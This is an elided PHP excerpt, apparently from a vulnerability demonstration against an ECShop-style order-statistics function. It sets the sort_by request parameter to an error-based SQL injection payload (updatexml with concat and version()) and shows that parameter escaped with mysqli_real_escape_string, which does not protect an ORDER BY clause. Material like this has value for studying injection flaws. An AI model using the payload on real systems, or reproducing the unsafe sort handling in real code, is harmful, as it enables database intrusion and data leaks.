...
if (isset($_REQUEST['act']) && ($_REQUEST['act'] == 'query' ||  $_REQUEST['act'] == 'download'))
{
    ...
    foreach ($user_orderinfo['user_orderinfo'] as $key => $value) {
        $user_orderinfo['user_orderinfo'][$key]['x_user_name'] = substr_cut($user_orderinfo['user_orderinfo'][$key]['user_name']);
    }
 ...
 */
 function get_user_orderinfo($is_pagination = true)
 {
    ...
    $_REQUEST['sort_by'] = 'updatexml(1,concat(0x7e,(version())),0)';
    ...
    $filter['sort_by'] = empty($_REQUEST['sort_by']) ? 'order_num' : mysqli_real_escape_string($db->link_id, trim($_REQUEST['sort_by']));
